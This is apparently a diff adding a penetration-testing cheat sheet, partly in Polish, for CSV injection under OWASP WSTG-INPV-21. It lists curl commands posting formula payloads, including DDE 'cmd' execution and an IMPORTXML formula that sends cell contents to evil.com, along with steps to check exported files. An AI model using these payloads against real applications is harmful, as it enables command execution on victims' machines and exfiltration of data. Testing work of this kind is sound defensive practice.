@@ -1,0 +1,39 @@
+================================================================================
+WSTG-INPV-21 — Testing for CSV Injection
+================================================================================
+CELE:
+- Identify CSV/spreadsheet export features that include untrusted input
+- Verify whether attacker-controlled values are interpreted as formulas
+
+================================================================================
+KOMENDY
+================================================================================
+
+# --- Wstrzykiwanie formul do pol eksportowanych do CSV ---
+curl -X POST "https://TARGET/data" -d "name==cmd|'/C calc'!A0"
+curl -X POST "https://TARGET/data" -d "name=+cmd|'/C calc'!A0"
+curl -X POST "https://TARGET/data" -d "name=-cmd|'/C calc'!A0"
+curl -X POST "https://TARGET/data" -d "name=@SUM(1+1)*cmd|'/C calc'!A0"
+curl -X POST "https://TARGET/data" -d "name==HYPERLINK(\"http://evil.com\",\"Click\")"
+curl -X POST "https://TARGET/data" -d "name==IMPORTXML(CONCAT(\"http://evil.com/\",CONCATENATE(A2:E2)),\"//a\")"
+
+# --- Pobranie wyeksportowanego CSV i sprawdzenie ---
+curl -s "https://TARGET/export/csv" -o export.csv
+cat export.csv | grep -E "^[=+\-@]"
+
+================================================================================
+KOMENDY Z WORDLISTAMI
+================================================================================
+
+# --- PayloadsAllTheThings CSV Injection ---
+# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/CSV Injection/README.md
+
+================================================================================
+WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+================================================================================
+1. Zidentyfikuj funkcje eksportu CSV/XLSX
+2. Wstaw payloady formul (=, +, -, @) w pola ktore beda eksportowane
+3. Pobierz wyeksportowany plik i otworz w Excel
+4. Sprawdz czy formuly sa wykonywane
+5. Testuj HYPERLINK i IMPORTXML do exfiltracji danych
+6. Sprawdz czy aplikacja sanityzuje dane przed eksportem
